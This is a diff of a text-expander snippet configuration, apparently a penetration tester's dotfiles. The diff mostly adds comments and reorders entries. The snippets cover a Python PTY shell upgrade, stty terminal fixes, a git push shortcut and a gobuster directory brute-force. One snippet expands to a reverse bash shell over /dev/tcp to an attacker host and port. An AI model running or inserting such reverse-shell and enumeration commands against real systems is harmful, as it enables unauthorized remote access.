@@ -1,12 +1,16 @@
 matches:
+  # Python bash
   - trigger: ":pypty"
     replace: "python -c 'import pty;pty.spawn(\"/bin/bash\")'"
+  # Stty raw
   - trigger: ":sttyraw"
     replace: "stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=xterm; stty rows 80 columns 173; reset;"
-  - trigger: ":rev-bash"
-    replace: "/bin/bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1"
+  # Git push without comment
   - trigger: ":dotpush"
     replace: "git add .; git commit -m '.'; git push"
+  # Reverse bash shell
+  - trigger: ":rev-bash"
+    replace: "/bin/bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1"
     vars:
       - name: LHOST
         type: shell
@@ -16,6 +20,7 @@ matches:
         type: shell
         params:
           cmd: grep LPORT ~/dotfiles/.env.hack | awk -F '=' '{print $NF}'
+  # Dirbuster dir
   - trigger: ":godir"
     replace: "gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://{{RPORT}}/"
     vars:
